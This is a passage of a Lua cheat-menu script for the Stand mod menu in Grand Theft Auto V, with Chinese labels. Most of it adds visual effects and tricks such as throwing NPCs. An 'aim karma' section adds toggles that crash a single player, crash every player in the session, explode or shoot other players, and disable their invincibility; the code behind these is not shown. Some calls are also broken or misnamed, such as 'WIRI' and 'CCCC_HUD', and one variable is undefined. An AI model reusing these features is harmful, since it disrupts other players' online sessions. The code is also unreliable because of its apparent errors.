                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_VEHICLE(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity_held, 100.0)
                VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(entity_held, true, true)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end)

local ped_held = 0
menu.toggle_loop(funfeatures_self,"举起丢掉npc", {"throwpeds"}, "举起来并扔掉npc。在npc附近按E使用，按住npc时按E仍 很好玩！.", function(on)
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_ped(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local ped = closest[1]
                local dist = closest[2]
                if dist <= 5 then 
                    request_anim_dict("missminuteman_1ig_2")
                    TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                    util.yield(500)
                    are_hands_up = true
                    ENTITY.SET_ENTITY_ALPHA(ped, 100)
                    ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, players.user_ped(), 0, 0, 0, 1.3, 180, 180, -180, true, false, true, true, 0, true)
                    entity_held = ped
                end 
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_PED(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                PED.SET_PED_TO_RAGDOLL(entity_held, 10, 10, 0, false, false, false)
                --ENTITY.SET_ENTITY_VELOCITY(entity_held, 0, 100, 0)
                ENTITY.SET_ENTITY_MAX_SPEED(entity_held, 100.0)
                ENTITY.APPLY_FORCE_TO_ENTITY(entity_held, 1, 0, 100, 0, 0, 0, 0, 0, true, false, true, false, false)
                AUDIO.PLAY_PAIN(entity_held, 7, 0, 0)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end)

--俄罗斯转盘
randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","1","2"}

menu.action(funfeatures_self,"生成战车" ,{""}, "每次生成不一样的颜色", function(on)
  car = CreateVehicle(1491277511, ENTITY.GET_ENTITY_COORDS(players.user_ped(),false),0,true)
  local titlle = "scr_martin1"
  WIRI.USE_PARTICLE_FX_ASSET(titlle)
  while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(titlle) do
    STREAMING.REQUEST_NAMED_PTFX_ASSET(titlle)
    util.yield(0)
  end
end)

    menu.toggle(funfeatures_self,"恶灵骑士" ,{""}, "", function(on)
        if on then 
            elqes()
            menu.trigger_commands("cjfireman on")
            menu.trigger_commands("footfire "..PLAYER.GET_PLAYER_NAME(players.user()).." on")
        else
            entities.delete_by_handle(vehicleelqs)
            menu.trigger_commands("cjfireman off")
            menu.trigger_commands("footfire "..PLAYER.GET_PLAYER_NAME(players.user()).." off")
        end

end)

weaponback = off
menu.toggle(funfeatures_self, "背藏武器", {}, "按Tab键", function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	weaponback = on
	if weaponback then
		spawnweapon = 0
	end
	curweap = CCCC_HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())
	if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == -1569615261) and weaponback then
		spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)
		attachweapon(spawnweapon)
	end
	while weaponback do
		if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then
			if not (spawnweapon == 0) then
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)
			end
		else
			ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)
		end
		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == curweap) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == -1569615261) then
			if not (spawnweapon == 0) then
				entities.delete_by_handle(spawnweapon)
			end
			curweap = HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())
			requestweapon(curweap)
			spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)
			if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)
			else
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)
			end
			attachweapon(spawnweapon)
		end
		util.yield()
	end
	entities.delete_by_handle(spawnweapon)
end)

menu.toggle_loop(funfeatures_self, "上帝之指", {"godfinger"}, "移动实体当你用手指指向他们时。按B键开始指向。", function()
    godfinger()
end)

menu.slider(selflist, '透明人物', {'JSghost'}, '修改您人物的不透明度.', 0, 100, 100, 25, function(value)
    ENTITY.SET_ENTITY_ALPHA(players.user_ped(), JS_tbls.alphaPoints[value / 25 + 1], false)
end)


menu.toggle(selflist, '冷血', {'JScoldBlooded'}, '移除您的热信号.\n其他人仍然可以看到它.', function(toggle)
    PED.SET_PED_HEATSCALE_OVERRIDE(players.user_ped(), (toggle and 0 or 1))
end)

menu.toggle_loop(aimkarma, '发送脚本事件崩溃', {''}, '如果他瞄准你自动崩溃', function()
    sendscriptcrash()
end)

menu.toggle_loop(aimkarma, '拉海滩', {''}, '自动拉海滩', function()
    sendgobreach()
end)

menu.toggle_loop(aimkarma, '无差别崩', {''}, '如果有sb打你,无差别崩溃全局', function()
    sendallplayercrash()
end)

menu.toggle_loop(aimkarma, '射击', {'JSbulletAimKarma'}, '射击瞄准您的玩家.', function()
    bulletaimkarma()
end)

menu.toggle_loop(aimkarma, '爆炸', {'JSexpAimKarma'}, '使用您的自定义爆炸设置爆炸玩家.', function()
    expaimkarma()
end)

menu.toggle_loop(aimkarma, '禁用无敌', {'JSgodAimKarma'}, '如果开着无敌的玩家瞄准你,这会通过向前推动他们的游戏画面来禁用他们的无敌模式.', function()
    godaimkarma()
end)

menu.action(aimkarma, 'Stand玩家瞄准惩罚', {}, '连接到Stand的玩家瞄准惩罚', function()
    menu.focus(menu.ref_by_path('World>Inhabitants>Player Aim Punishments>Anonymous Explosion', 37))
end)

menu.toggle(selflist, '无声脚步', {'JSquietSteps'}, '禁用您的脚步声.', function(toggle)
    AUDIO._SET_PED_AUDIO_FOOTSTEP_LOUD(players.user_ped(), not toggle)
end)

menu.toggle(funfeatures_self, "雪人",{""}, "",function(on)
    snowpeople(on)
end)

huorentexiao = menu.list(funfeatures_self, "火人", {}, "", function(); end)
menu.toggle(huorentexiao, "火人1", {"fireman"}, "请关掉无敌", function(on)
    firepersonl(on)
end)

        menu.toggle(huorentexiao, "火人2",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("fire_wrecked_truck", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(huorentexiao, "火人3",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_recrash_rescue")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_recrash_rescue")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_recrash_rescue_fire", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

texiao = menu.list(funfeatures_self, "小特效", {}, "", function(); end)
        menu.action(texiao, "一闪而过V1",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_rcbarry1")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry1")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_alien_teleport", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.action(texiao, "一闪而过V2",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_rcbarry1")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry1")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_alien_disintegrate", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

menu.action(texiao, "一闪而过V3", {""}, "", function ()
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst_spawn"
    diaoshepao(ptfx_asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, players.user_ped(), 0.0, 0.0, -0.3, 90.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0)
    for i=1, 10 do 
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, i, 0.0)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 67, 0.0, false, false, 0.0, true)
    end
end)

        menu.action(texiao, "一闪而过V4",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_ray_heli_aprtmnt_exp", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.action(texiao, "小丑特效",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_rcbarry2")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_clown_appears", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
           
        menu.action(texiao, "黑暗力量",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_sum2_hal")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sum2_hal_rider_death_green", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

menu.toggle_loop(texiao, "变身V1", {""}, "蓝", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_blue", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "变身V2", {""}, "绿", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "变身V3", {""}, "黄", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "变身V4", {""}, "白", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_greyblack", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "变身V5", {""}, "综合", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)         
end)

menu.toggle_loop(texiao, "喷屎", {""}, "", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"ent_anim_snot_blow", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "喷屁", {""}, "", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"ent_anim_cig_exhale_mth_car", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "电焊", {""}, "", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"ent_brk_sparking_wires", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "发光", {"bodylight"}, "", function()
    personllight()
end) 

menu.toggle_loop(texiao, "发光V2", {""}, "", function()
    personllightb()
end)

menu.toggle_loop(texiao, "发光V3", {""}, "", function()
    personllightc()
end)

menu.toggle_loop(texiao, "发光V4", {""}, "", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"exp_air_molotov_lod", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(texiao, "头上冒烟", {""}, "", function()
    personllighta()
end)



        menu.toggle(texiao, "气场拉满",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_reconstructionaccident")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_reconstruct_pipefall_debris", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(texiao, "喷血",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_solomon3")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_solomon3")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_trev4_747_engine_debris", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(texiao, "水花",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_ray_train_water_wash", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(texiao, "水花2",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_wfall_splash_sml", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(texiao, "排毒",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_smoke_general", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(texiao, "龙卷风",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("env_dust_devil_rural_sma", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(texiao, "飘飘落叶",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_wind_tree_leaves", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

        menu.toggle(texiao, "夜光灯",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_fbi_light_door", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

menu.toggle(texiao, "魂环",{""}, "",function(on)
    local six = "prop_mp_halo_lrg"
    local sixs = "prop_mp_halo_med"
    local sixss = "prop_mp_halo_point"
    local sixsss = "prop_mp_halo"
    local sixssss = "prop_mp_halo_rotate"
    local sixsssss = "prop_mp_halo_rotate_lrg"
    local sixssssss = "prop_mp_halo_rotate_med"
    local sixsssssss = "prop_mp_halo_rotate_sm"
    if on then     
        attach_to_player(six, 2, 0.0, 0, -0.12, 0, 0,0)
        attach_to_player(sixss, 2, 0, 0, -0.32, 0, 0,0)
        attach_to_player(sixs, 2, 0, 0, 0, -0.22, 0,0)
        attach_to_player(sixsss, 2, 0, 0, -0.02, 0, 0,0)
        attach_to_player(sixssss, 2, 0, 0, -0.42, 0, 0,0)
        attach_to_player(sixsssss, 2, 0, 0, -0.52, 0, 0,0)
        attach_to_player(sixssssss, 2, 0, 0, -0.62, 0, 0,0)
        attach_to_player(sixsssssss, 2, 0, 0, -0.72, 0, 0,0)
    else
        delete_object(six)
        delete_object(sixss)
        delete_object(sixs)
        delete_object(sixsss)
        delete_object(sixssss)
        delete_object(sixsssss)
        delete_object(sixssssss)
        delete_object(sixsssssss)
    end
end)

        menu.toggle(texiao, "超级赛亚人",{"cjfireman"}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_ray_heli_aprtmnt_s_fire", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

menu.toggle_loop(texiao, "元气弹", {""}, "", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"ent_anim_paparazzi_flash", player_pos.x, player_pos.y, player_pos.z +2.5, 0, 0, 0, 20, false, false, false)
end)

menu.toggle(texiao, "雷神之锤",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("xm3_prop_xm3_hammer_01"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.07, 0, 0, -100, -90, 100, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

        menu.toggle(texiao, "雷神",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_elec_crackle", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end

            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

menu.toggle_loop(texiao, "雷神v2", {""}, "", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"ent_dst_elec_fire_sp", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
end)

menu.toggle_loop(funfeatures_self, "设置力场", {"forcefield"}, "", function()
	forcefielddd()
end, function()
	set_explosion_proof(players.user_ped(), false)
end)


menu.slider_text(funfeatures_self, "力场", {}, "", options_force, function(index)
	forcefield_set(index)
end)

menu.toggle_loop(funfeatures_self, "原力", {"jedimode"}, "在附近的车辆上使用绝地武士原力", function()
	jedmode()
end, function()
	state = 0
end)

menu.toggle_loop(funfeatures_self, "打坐", {"carpetride"}, "", function()
    carpetridexx()
end,function()
TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
	ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
	ENTITY.SET_ENTITY_VISIBLE(object, false, false)
	entities.delete_by_handle(object)
	state = 0
end)

local ls_driveonair
walkonwater = false
menu.toggle(funfeatures_self, "在水上行走", {"walkonwater"}, "",  function(on)
    walkonwater = on
    if on then
        menu.set_value(ls_driveonair, false)
    end
end)
quantoutexiao = menu.list(funfeatures_self, "拳头特效", {}, "", function(); end)
        menu.toggle(quantoutexiao, "火拳艾斯",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("fire_wrecked_plane_cockpit", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
        
        menu.toggle(quantoutexiao, "雷电拳",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_reconstructionaccident")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 3, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
        
        menu.toggle(quantoutexiao, "血拳V1",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("blood_mist_prop", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
        
        menu.toggle(quantoutexiao, "血拳V2",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scrape_blood_car", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

    menu.toggle(funfeatures_self, "灵魂出窍", {""}, "", function(toggle)
        ghost = toggle 
